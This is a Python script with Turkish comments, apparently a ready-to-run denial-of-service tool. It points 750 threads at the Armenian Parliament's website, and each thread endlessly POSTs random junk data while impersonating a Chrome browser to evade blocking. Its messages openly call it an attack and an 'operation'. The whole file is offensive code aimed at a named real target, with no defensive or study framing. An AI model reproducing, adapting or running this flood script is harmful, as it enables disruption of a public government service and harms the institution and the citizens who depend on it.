from curl_cffi import requests
import threading
import random
import time
import sys
from datetime import datetime

# --- OPERASYONEL AYARLAR ---
# Hedef, yeniden Ermenistan Parlamentosu olarak ayarlandı. Değiştirebilirsin.
TARGET_URL = 'https://www.parliament.am/' 
WORKER_COUNT = 750
# ----------------------------

# --- RENK VE İKON KODLARI ---
class bcolors:
    OKGREEN = '\033[92m'
    FAIL = '\033[91m'
    BLUE = '\033[94m'
    ENDC = '\033[0m'

ROCKET = "🚀"
SUCCESS = "✅"
FAILURE = "❌"

# --- Sayaçlar ---
success_count = 0
failure_count = 0
counter_lock = threading.Lock()

def launch_piercer(worker_id):
    global success_count, failure_count
    
    session = requests.Session()
    
    while True:
        try:
            timestamp = datetime.now().strftime('%H:%M:%S')
            # 1. Aşama: Roket Gönderiliyor
            print(f"{bcolors.BLUE}[{timestamp} | Worker #{worker_id}] {ROCKET} Roket gönderiliyor...{bcolors.ENDC}")
            
            junk_data = ''.join(random.choice('abcdefghijklmnopqrstuvwxyz0123456789') for i in range(512))
            response = session.post(
                TARGET_URL,
                impersonate="chrome110",
                data={'data': junk_data},
                timeout=15
            )
            response.raise_for_status()

            # 2. Aşama: Gönderim Başarılı
            with counter_lock:
                success_count += 1
            print(f"{bcolors.OKGREEN}[{timestamp} | Worker #{worker_id}] {SUCCESS} Gönderim başarılı! (Kod: {response.status_code}) | Toplam Başarılı: {success_count}{bcolors.ENDC}")
            time.sleep(random.uniform(0.5, 2)) # Başarı sonrası kısa bir bekleme

        except Exception as e:
            # 3. Aşama: Gönderim Başarısız
            with counter_lock:
                failure_count += 1
            print(f"{bcolors.FAIL}[{timestamp} | Worker #{worker_id}] {FAILURE} Gönderim başarısız! (Hata: {e.__class__.__name__}) | Toplam Başarısız: {failure_count}{bcolors.ENDC}")
            time.sleep(3) # Başarısızlık sonrası daha uzun bekleme

if __name__ == "__main__":
    print("=====================================================")
    print("  MODIE: 'Roket Komutanlığı' Protokolü Aktive Edildi  ")
    print("=====================================================")
    print(f"Hedef: {TARGET_URL}") 
    print(f"Worker Sayısı: {WORKER_COUNT}")
    print("Saldırı başlatılıyor... Anlık roket raporlaması devrede.")
    print("=====================================================")

    threads = []
    for i in range(WORKER_COUNT):
        thread = threading.Thread(target=launch_piercer, args=(i+1,), daemon=True)
        threads.append(thread)
        thread.start()

    try:
        while True:
            time.sleep(10) # Ana thread'in çok meşgul olmasını engelle
    except KeyboardInterrupt:
        print("\n[!] Operasyon kullanıcı tarafından durduruldu.")
        sys.exit(0)
